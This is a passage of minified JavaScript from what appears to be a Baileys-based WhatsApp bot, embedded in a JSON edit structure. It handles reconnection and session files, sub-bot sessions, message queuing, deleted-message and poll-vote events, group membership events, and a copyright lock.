this.type)(a = !!(e && e.error && e.error.output && e.error.output.statusCode) && e.error.output.statusCode) && (a === DisconnectReason.badSession ? (this.emit(\\\"error\\\", {\n                        message: \\\"Bad session file\\\"\n                    }), session.deleteCreds(this.sessionFile), await session.isBackupExist(this.mecha) && (await session.restore(this.mecha, this.sessionFile), await delay(1500), this.initBaileys())) : a === DisconnectReason.connectionClosed ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection closed, reconnecting . . .\\\"\n                    }), this.initBaileys()) : a === DisconnectReason.connectionLost ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection lost, reconnecting . . .\\\"\n                    }), this.initBaileys()) : a === DisconnectReason.connectionReplaced ? (this.emit(\\\"error\\\", {\n                        message: \\\"Session running on another server\\\"\n                    }), process.exit(0)) : a === DisconnectReason.loggedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Device logged out\\\"\n                    }), session.clearSession(this.sessionFile)) : a === DisconnectReason.restartRequired ? this.initBaileys() : a === DisconnectReason.multideviceMismatch ? (this.emit(\\\"error\\\", {\n                        message: \\\"Multi device mismatch\\\"\n                    }), this.clearSessionAndRestart()) : a === DisconnectReason.timedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection timed-out, reconnecting . . .\\\"\n                    }), this.initBaileys()) : a === DisconnectReason.unavailableService ? (this.emit(\\\"error\\\", {\n                        message: \\\"Service unavailable, reconnecting . . .\\\"\n                    }), this.initBaileys()) : 405 === a ? (this.emit(\\\"error\\\", {\n                        message: \\\"Method not allowed\\\"\n                    }), session.deleteCreds(this.sessionFile), await session.isBackupExist(this.mecha) && (await session.restore(this.mecha, this.sessionFile), await delay(1500), this.initBaileys())) : 503 === a ? (this.emit(\\\"error\\\", {\n                        message: \\\"Service unavailable, reconnecting . . .\\\"\n                    }), this.initBaileys()) : (this.emit(\\\"error\\\", {\n                        message: \\\"Connection error. (Reason: \\\" + a + \\\")\\\"\n                    }), session.clearSession(this.sessionFile)));\n                    else if (this.type && \\\"jadibot\\\" === this.type) {\n                    let t = (this.pairing.number || \\\"\\\").replace(/[^0-9]/g, \\\"\\\") + \\\"@s.whatsapp.net\\\";\n                    i = global.db.jadibot.find(e => e.number === t), (s = !!(e && e.error && e.error.output && e.error.output.statusCode) && e.error.output.statusCode) && (s === DisconnectReason.badSession ? (this.emit(\\\"error\\\", {\n                        message: \\\"Bad session file\\\"\n                    }), delete global.jadibot[t], this.mecha.end(), this.clearSessionAndRestart()) : s === DisconnectReason.connectionClosed ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection closed, reconnecting . . .\\\"\n                    }), delete global.jadibot[t], this.mecha.end(), this.initBaileys()) : s === DisconnectReason.connectionLost ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection lost, reconnecting . . .\\\"\n                    }), this.initBaileys()) : s === DisconnectReason.connectionReplaced ? (this.emit(\\\"error\\\", {\n                        message: \\\"Session running on another server\\\"\n                    }), delete global.jadibot[t], this.mecha.end()) : s === DisconnectReason.loggedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Device logged out\\\"\n                    }), delete global.jadibot[t], i.status = !1, this.mecha.end(), this.mecha.logout(), this.clearSessionAndRestart()) : s === DisconnectReason.restartRequired ? this.initBaileys() : s === DisconnectReason.multideviceMismatch ? (this.emit(\\\"error\\\", {\n                        message: \\\"Multi device mismatch\\\"\n                    }), this.clearSessionAndRestart()) : s === DisconnectReason.timedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection timed-out, reconnecting . . .\\\"\n                    }), delete global.jadibot[t], this.mecha.end(), this.initBaileys()) : 405 === s ? (this.emit(\\\"error\\\", {\n                        message: \\\"Method not allowed\\\"\n                    }), this.clearSessionAndRestart()) : (this.emit(\\\"error\\\", {\n                        message: \\\"Connection error. (Reason: \\\" + s + \\\")\\\"\n                    }), delete global.jadibot[t], this.mecha.end()))\n                }\n            }), this.mecha.ev.on(\\\"creds.update\\\", t), this.mecha.ws.on(\\\"CB:call\\\", e => {\n                \\\"offer\\\" == e.content[0].tag ? (e = {\n                    id: e.content[0].attrs[\\\"call-id\\\"],\n                    from: e.content[0].attrs[\\\"call-creator\\\"]\n                }, this.emit(\\\"caller\\\", e)) : this.emit(\\\"caller\\\", !1)\n            })\n        };\n        clearSessionAndRestart = () => {\n            var e = path.join(process.cwd(), this.sessionFile);\n            fs.rmSync(e, {\n                recursive: !0,\n                force: !0\n            }), this.initBaileys()\n        };\n        busEvents = () => [{\n            event: \\\"messages.upsert\\\",\n            execute: async c => {\n                require(\\\"./database.js\\\")(this.mecha, c), require(\\\"./detects.js\\\")(this.mecha, c);\n                var e = c.messages[0];\n                if (!e.message) return !1;\n                if (processedMessages.has(e.key.id)) return !1;\n                processedMessages.add(e.key.id);\n                var t = e.key.id;\n                queque.add(t, e), queque.processing[t] || queque.processQueue(t, async s => {\n                    if (extra.initSerialize(this.mecha, s, this.store), s.msg && 0 === s.msg.type) {\n                        var t = await this.store.loadMessage(s.chat, s.key.id, this.mecha);\n                        for (let e = 0; e < 5 && (\\\"protocolMessage\\\" != t.mtype || (t = await this.store.loadMessage(s.chat, s.key.id, this.mecha), await delay(1e3), \\\"protocolMessage\\\" == t.mtype)); e++);\n                        var i = proto.WebMessageInfo.fromObject({\n                            key: t.key,\n                            message: {\n                                [t.mtype]: t.msg\n                            }\n                        });\n                        this.emit(\\\"message.delete\\\", {\n                            origin: s,\n                            delete: i\n                        })\n                    } else this.emit(\\\"message.delete\\\", !1);\n                    if (!s.isBot && s.message?.pollUpdateMessage) {\n                        if (!(i = normalizeMessageContent(s.message))) return;\n                        let t = i.pollUpdateMessage.pollCreationMessageKey,\n                            e = this.store.messages[s.chat]?.array?.find(e => t.id === e.key.id);\n                        if (!e) return;\n                        var a = e.message,\n                            r = jidNormalizedUser(this.mecha.authState.creds.me.id),\n                            n = getKeyAuthor(s.key, r),\n                            r = getKeyAuthor(t, r),\n                            o = a.messageContextInfo?.messageSecret;\n                        if (!(i = decryptPollVote(i.pollUpdateMessage.vote, {\n                                pollEncKey: o,\n                                pollCreatorJid: r,\n                                pollMsgId: t.id,\n                                voterJid: n\n                            }))) return;\n                        if (o = [{\n                                key: t,\n                                update: {\n                                    pollUpdates: [{\n                                        pollUpdateMessageKey: s.key,\n                                        vote: i,\n                                        senderTimestampMs: s.messageTimestamp\n                                    }]\n                                }\n                            }], !(r = await getAggregateVotesInPollMessage({\n                                message: a,\n                                pollUpdates: o[0].update.pollUpdates\n                            }))) return;\n                        if (!(n = r?.find(e => 0 !== e.voters.length)?.name)) return;\n                        i = (s.prefix || \\\".\\\") + n, s.isPc && await this.mecha.sendMessage(s.chat, {\n                            delete: e\n                        }), await this.appenTextMessage(s, i, c)\n                    }\n                    this.commands = this.getCombinedArray(this.plugins), this.events = Object.fromEntries(Object.entries(this.plugins).filter(([e]) => e)), this.emit(\\\"message\\\", {\n                        m: s,\n                        store: this.store,\n                        plugins: this.plugins,\n                        commands: this.commands,\n                        events: this.events\n                    }), this.mecha.chats = this.mecha.chats || [], (a = this.mecha.chats.find(e => e.jid === this.mecha.decodeJid(s.sender))) && (a.name = s.pushName), s.sender.endsWith(\\\".net\\\") && !a && this.mecha.chats.push({\n                        jid: this.mecha.decodeJid(s.sender),\n                        name: s.pushName || \\\"not known\\\"\n                    }), this.mecha.getNameV2 = t => {\n                        var e = this.mecha.chats.find(e => e.jid === this.mecha.decodeJid(t));\n                        return e ? e.name : null\n                    }, this.emit(\\\"chats.set\\\", this.mecha.chats)\n                })\n            }\n        }, {\n            event: \\\"contacts.update\\\",\n            execute: e => {\n                for (var t of e) {\n                    var s = jidNormalizedUser(t.id);\n                    this.store && this.store.contacts && (this.store.contacts[s] = {\n                        id: s,\n                        name: t.notify\n                    })\n                }\n            }\n        }, {\n            event: \\\"contacts.upsert\\\",\n            execute: e => {\n                for (var t of e) {\n                    var s = jidNormalizedUser(t.id);\n                    this.store && this.store.contacts && (this.store.contacts[s] = {\n                        ...t || {},\n                        isContact: !0\n                    })\n                }\n            }\n        }, {\n            event: \\\"groups.update\\\",\n            execute: async e => {\n                for (var t of e) {\n                    console.log(t);\n                    var s = t.id;\n                    this.store.groupMetadata[s] && (this.store.groupMetadata[s] = {\n                        ...this.store.groupMetadata[s] || {},\n                        ...t || {}\n                    })\n                }\n            }\n        }, {\n            event: \\\"presence.update\\\",\n            execute: e => this.emit(\\\"presence.update\\\", e)\n        }, {\n            event: \\\"group-participants.update\\\",\n            execute: async e => {\n                var t = jidNormalizedUser(this.mecha.user.id);\n                if (e.participants.includes(t)) return !1;\n                t = null != global.db.metadata[e.id] ? global.db.metadata[e.id] : await this.mecha.groupMetadata(e.id), \\\"add\\\" === e.action ? this.emit(\\\"group.add\\\", {\n                    act: \\\"add\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                }) : \\\"remove\\\" === e.action ? this.emit(\\\"group.remove\\\", {\n                    act: \\\"remove\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                }) : \\\"promote\\\" === e.action ? this.emit(\\\"group.promote\\\", {\n                    act: \\\"promote\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                }) : \\\"demote\\\" === e.action && this.emit(\\\"group.demote\\\", {\n                    act: \\\"demote\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                })\n            }\n        }];\n        initBusEvents = e => {\n            var t, s;\n            this.mecha = e;\n            for ({\n                    event: t,\n                    execute: s\n                }\n                of this.busEvents()) this.mecha.ev.on(t, s)\n        };\n        appenTextMessage = async (e, t, s) => {\n            (t = await generateWAMessage(e.chat, {\n                text: t,\n                mentions: e.mentionedJid\n            }, {\n                userJid: this.mecha.user.id,\n                quoted: e.quoted && e.quoted.fakeObj\n            })).key.fromMe = e.key.fromMe, t.key.id = e.key.id, t.pushName = e.pushName, e.isGc && (t.key.participant = t.participant = e.key.participant), e = {\n                ...s,\n                messages: [proto.WebMessageInfo.fromObject(t)],\n                type: \\\"append\\\"\n            }, this.mecha.ev.emit(\\\"messages.upsert\\\", e)\n        }\n    }\n    let e = e => {\n        try {\n            e.fromJSON(JSON.parse(global.db.memoryStore))\n        } catch {\n            global.db.memoryStore = global.db.memoryStore || JSON.stringify(e.toJSON()), e.fromJSON(JSON.parse(global.db.memoryStore))\n        }\n    };\n    exports.Baileys = b, exports.InvCloud = e\n} else {\n    class Xa extends EventEmitter {\n        constructor(e = 0, t) {\n            super(), this.mecha()\n        }\n        mecha = () => {\n            console.log(chalk.redBright(\\\"You can't use this program because of copyright issues!!\\\"))\n        }\n    }\n    let e = () => {};\n    exports.Baileys = Xa, exports.InvCloud = e\n}"
    }
  ],
  "remove": []
}